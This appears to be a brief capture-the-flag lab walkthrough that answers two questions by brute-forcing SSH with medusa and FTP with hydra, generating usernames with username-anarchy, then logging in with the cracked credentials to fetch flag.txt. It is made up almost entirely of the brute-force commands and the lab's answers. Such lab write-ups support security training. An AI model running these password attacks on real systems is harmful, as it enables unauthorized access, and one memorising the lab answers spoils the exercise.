What is the username of the ftp user you find via brute-forcing?
```
medusa -M ssh -h 94.237.58.137 -n 41041 -u satwossh -P 2023-200_most_used_passwords.txt -t 10
ssh satwossh@94.237.58.137 -p 41041
yes
password1
cat IncidentReport.txt
./username-anarchy/username-anarchy Thomas Smith > thomas_smith_usernames.txt
hydra -L thomas_smith_usernames.txt -P passwords.txt 127.0.0.1 -s 21 ftp
```

What is the flag contained within flag.txt
```
ftp
open 127.0.0.1
thomas
chocolate!
get flag.txt
exit
cat flag.txt
```
